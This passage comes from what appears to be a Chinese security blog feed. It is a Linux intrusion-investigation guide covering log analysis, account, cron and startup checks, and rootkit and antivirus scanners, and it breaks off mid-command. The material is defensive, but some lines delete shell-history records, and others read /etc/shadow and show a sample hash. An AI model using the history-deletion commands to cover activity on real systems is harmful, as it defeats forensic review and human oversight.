title="A、常用的shell命令"></a>A、常用的shell命令</h4><p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p><p>小技巧：</p><p>1、grep显示前后几行信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​标准unix/linux下的grep通过下面參数控制上下文：</span><br><span class="line">​grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行</span><br><span class="line">​grep -B 5 foo file 显示foo及前5行</span><br><span class="line">​grep -A 5 foo file 显示foo及后5行</span><br><span class="line">​查看grep版本号的方法是</span><br><span class="line">​grep -V</span><br></pre></td></tr></table></figure><p>2、grep 查找含有某字符串的所有文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;hello,world!&quot; </span><br><span class="line">* : 表示当前目录所有文件，也可以是某个文件名</span><br><span class="line">-r 是递归查找</span><br><span class="line">-n 是显示行号</span><br><span class="line">-R 查找所有文件包含子目录</span><br><span class="line">-i 忽略大小写</span><br></pre></td></tr></table></figure><p>3、如何显示一个文件的某几行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat input_file | tail -n +1000 | head -n 2000</span><br><span class="line">#从第1000行开始，显示2000行。即显示1000~2999行</span><br></pre></td></tr></table></figure><p>4、find /etc -name init </p><pre><code>//在目录/etc中查找文件init</code></pre><p>5、只是显示/etc/passwd的账户</p><pre><code>`cat /etc/passwd |awk  -F &apos;:&apos;  &apos;{print $1}&apos;`  //awk -F指定域分隔符为&apos;:&apos;，将记录按指定的域分隔符划分域，填充域，​$0则表示所有域,$1表示第一个域,​$n表示第n个域。</code></pre><p>6、sed -i ‘153,$d’ .bash_history</p><pre><code>删除历史操作记录，只保留前153行</code></pre><h4 id="B、日志分析技巧"><a href="#B、日志分析技巧" class="headerlink" title="B、日志分析技巧"></a>B、日志分析技巧</h4><p><strong>A、/var/log/secure</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; /var/log/secure|perl -e &apos;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&apos;|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： </span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &apos;&#123;print $1,$2,$3,$9,$11&#125;&apos; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &apos;kali&apos;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &apos;kali&apos; owned by &apos;kali&apos;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &apos;kali&apos; owned by &apos;kali&apos;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure><p><strong>2、/var/log/yum.log</strong></p><p>软件安装升级卸载日志：</p><figure class="highlight plain"><figcaption><span>install gcc</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc</span><br><span class="line"></span><br><span class="line">[root@bogon ~]# more /var/log/yum.log</span><br><span class="line"></span><br><span class="line">Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日志分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第二章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第1章第2篇：Linux入侵排查</title>
      <link href="/2019/10/16/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"/>
      <url>/2019/10/16/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第2篇：Linux入侵排查"><a href="#第2篇：Linux入侵排查" class="headerlink" title="第2篇：Linux入侵排查"></a>第2篇：Linux入侵排查</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些Linux服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-账号安全"><a href="#1-1-账号安全" class="headerlink" title="1.1 账号安全"></a>1.1 账号安全</h4><p><strong>基本使用：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、用户信息文件/etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line"></span><br><span class="line">2、影子文件/etc/shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who     查看当前登录用户（tty本地登陆  pts远程登录）</span><br><span class="line">w       查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime  查看登陆多久、多少用户，负载</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &apos;$3==0&#123;print $1&#125;&apos; /etc/passwd</span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &apos;/\$1|\$6/&#123;print $1&#125;&apos; /etc/shadow</span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span><br><span class="line">userdel user       删除user用户</span><br><span class="line">userdel -r user    将删除user用户，并且将/home目录下的user目录一并删除</span><br></pre></td></tr></table></figure><h4 id="1-2-历史命令"><a href="#1-2-历史命令" class="headerlink" title="1.2 历史命令"></a>1.2 历史命令</h4><p><strong>基本使用：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">通过.bash_history查看帐号执行过的系统命令</span><br><span class="line">1、root的历史命令</span><br><span class="line">histroy</span><br><span class="line">2、打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令</span><br><span class="line"></span><br><span class="line">为历史的命令增加登录的IP地址、执行命令时间等信息：</span><br><span class="line">1）保存1万条命令</span><br><span class="line">sed -i &apos;s/^HISTSIZE=1000/HISTSIZE=10000/g&apos; /etc/profile</span><br><span class="line">2）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk &apos;&#123;print $NF&#125;&apos; | sed -e &apos;s/[()]//g&apos;`</span><br><span class="line">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND=&quot;history -a&quot;</span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line">3）source /etc/profile让配置生效</span><br><span class="line"></span><br><span class="line">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</span><br><span class="line"></span><br><span class="line">3、历史操作命令的清除：history -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入用户目录下</span><br><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure><h4 id="1-3-检查异常端口"><a href="#1-3-检查异常端口" class="headerlink" title="1.3 检查异常端口"></a>1.3 检查异常端口</h4><p>使用netstat 网络连接命令，分析可疑端口、IP、PID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line">查看下pid所对应的进程文件路径，</span><br><span class="line">运行ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为对应的pid 号）</span><br></pre></td></tr></table></figure><h4 id="1-4-检查异常进程"><a href="#1-4-检查异常进程" class="headerlink" title="1.4 检查异常进程"></a>1.4 检查异常进程</h4><p>使用ps命令，分析进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure><h4 id="1-5-检查开机启动项"><a href="#1-5-检查开机启动项" class="headerlink" title="1.5 检查开机启动项"></a>1.5 检查开机启动项</h4><p><strong>基本使用：</strong></p><p>系统运行级别示意图：</p><table><thead><tr><th align="center">运行级别</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">关机</td></tr><tr><td align="center">1</td><td align="center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td></tr><tr><td align="center">2</td><td align="center">不完全的命令行模式，不含NFS服务</td></tr><tr><td align="center">3</td><td align="center">完全的命令行模式，就是标准字符界面</td></tr><tr><td align="center">4</td><td align="center">系统保留</td></tr><tr><td align="center">5</td><td align="center">图形模式</td></tr><tr><td align="center">6</td><td align="center">重启动</td></tr></tbody></table><p>查看运行级别命令<br>    runlevel   </p><p>系统默认允许级别</p><pre><code>vi  /etc/inittabid=3：initdefault  系统开机后直接进入哪个运行级别</code></pre><p>开机启动配置文件</p><pre><code>/etc/rc.local/etc/rc.d/rc[0~6].d</code></pre><p>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在/etc/init.d目录下，然后在/etc/rc.d/rc*.d中建立软链接即可</p><pre><code>root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</code></pre><p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p><p><strong>入侵排查：</strong></p><p>启动项文件：<br>    more /etc/rc.local<br>    /etc/rc.d/rc[0~6].d<br>    ls -l /etc/rc.d/rc3.d/</p><h4 id="1-6-检查定时任务"><a href="#1-6-检查定时任务" class="headerlink" title="1.6 检查定时任务"></a>1.6 检查定时任务</h4><p><strong>基本使用</strong></p><p>1、利用crontab创建计划任务</p><ul><li>基本命令</li></ul><p>crontab -l   列出某个用户cron服务的详细内容</p><p>Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</p><p>crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)</p><p>crontab -e   使用编辑器编辑当前的crontab文件 </p><p>如：*/1 * * * * echo “hello world” &gt;&gt; /tmp/test.txt 每分钟写入文件</p><p>2、利用anacron实现异步定时任务调度</p><ul><li>使用案例</li></ul><p>每天运行 /home/backup.sh脚本：<br>    vi /etc/anacrontab<br>    @daily    10    example.daily   /bin/bash /home/backup.sh</p><p>当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</p><p><strong>入侵排查</strong></p><p>重点关注以下目录中是否存在恶意脚本</p><pre><code>/var/spool/cron/* /etc/crontab/etc/cron.d/*/etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/*</code></pre><p>小技巧：</p><pre><code>more /etc/cron.daily/*  查看目录下所有文件</code></pre><h4 id="1-7-检查服务"><a href="#1-7-检查服务" class="headerlink" title="1.7 检查服务"></a>1.7 检查服务</h4><p><strong>服务自启动</strong></p><p>第一种修改方法：</p><pre><code>chkconfig [--level 运行级别] [独立服务名] [on|off]chkconfig –level  2345 httpd on  开启自启动chkconfig httpd on （默认level是2345）</code></pre><p>第二种修改方法：</p><pre><code>修改/etc/re.d/rc.local 文件  加入 /etc/init.d/httpd start</code></pre><p>第三种修改方法：</p><p>使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务。</p><p><strong>入侵排查</strong></p><p>1、查询已安装的服务：</p><p>RPM包安装的服务</p><pre><code>chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务ps aux | grep crond 查看当前服务系统在3与5级别下的启动项 中文环境chkconfig --list | grep &quot;3:启用\|5:启用&quot;英文环境chkconfig --list | grep &quot;3:on\|5:on&quot;</code></pre><p>源码包安装的服务</p><pre><code>查看服务安装位置 ，一般是在/user/local/service httpd start搜索/etc/rc.d/init.d/  查看是否存在</code></pre><h4 id="1-8-检查异常文件"><a href="#1-8-检查异常文件" class="headerlink" title="1.8 检查异常文件"></a>1.8 检查异常文件</h4><p>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</p><p>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>​    可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f  找出 /opt 下一天前访问过的文件</p><p>3、针对可疑文件可以使用stat进行创建修改时间。</p><h4 id="1-9-检查系统日志"><a href="#1-9-检查系统日志" class="headerlink" title="1.9 检查系统日志"></a>1.9 检查系统日志</h4><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">记录了系统定时任务相关的日志</td></tr><tr><td align="center">/var/log/cups</td><td align="center">记录打印信息的日志</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">记录邮件信息</td></tr><tr><td align="center">/var/log/message</td><td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td align="center">/var/log/secure</td><td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>日志分析技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; /var/log/secure|perl -e &apos;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&apos;|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： </span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &apos;&#123;print $1,$2,$3,$9,$11&#125;&apos; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &apos;kali&apos;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &apos;kali&apos; owned by &apos;kali&apos;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &apos;kali&apos; owned by &apos;kali&apos;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-Rootkit查杀"><a href="#2-1-Rootkit查杀" class="headerlink" title="2.1 Rootkit查杀"></a>2.1 Rootkit查杀</h4><ul><li><p>chkrootkit  </p><p>网址：<a href="http://www.chkrootkit.org" target="_blank" rel="noopener">http://www.chkrootkit.org</a> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense</span><br><span class="line">#编译完成没有报错的话执行检查</span><br><span class="line">./chkrootkit</span><br></pre></td></tr></table></figure></li><li><p>rkhunter</p><p>网址：<a href="http://rkhunter.sourceforge.net" target="_blank" rel="noopener">http://rkhunter.sourceforge.net</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line">cd rkhunter-1.4.4</span><br><span class="line">./installer.sh --install</span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><ul><li><p>Clamav</p><p>ClamAV的官方下载地址为：<a href="http://www.clamav.net/download.html" target="_blank" rel="noopener">http://www.clamav.net/download.html</a> </p><p>安装方式一： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1、安装zlib：</span><br><span class="line">wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line">cd zlib-1.2.7</span><br><span class="line">#安装一下gcc编译环境： yum install gcc</span><br><span class="line">CFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix= /usr/local/zlib/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2、添加用户组clamav和组成员clamav：</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s /bin/false -c &quot;Clam AntiVirus&quot; clamav</span><br><span class="line"></span><br><span class="line">3、安装Clamav</span><br><span class="line">tar –zxvf clamav-0.97.6.tar.gz</span><br><span class="line">cd clamav-0.97.6</span><br><span class="line">./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4、配置Clamav</span><br><span class="line">mkdir /opt/clamav/logs</span><br><span class="line">mkdir /opt/clamav/updata</span><br><span class="line">touch /opt/clamav/logs/freshclam.log</span><br><span class="line">touch /opt/clamav/logs/clamd.log</span><br><span class="line">cd /opt/clamav/logs</span><br><span class="line">chown clamav:clamav clamd.log</span><br><span class="line">chown clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5、ClamAV 使用：</span><br><span class="line"> /opt/clamav/bin/freshclam 升级病毒库</span><br><span class="line">./clamscan –h 查看相应的帮助信息</span><br><span class="line">./clamscan -r /home  扫描所有用户的主目录就使用</span><br><span class="line">./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果</span><br></pre></td></tr></table></figure><p>安装方式二： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">yum install -y clamav</span><br><span class="line">#更新病毒库</span><br><span class="line">freshclam</span><br><span class="line">#扫描方法</span><br><span class="line">clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log</span><br><span class="line">clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log</span><br><span class="line">clamscan -r /usr --max-dir-recursion=5 -l 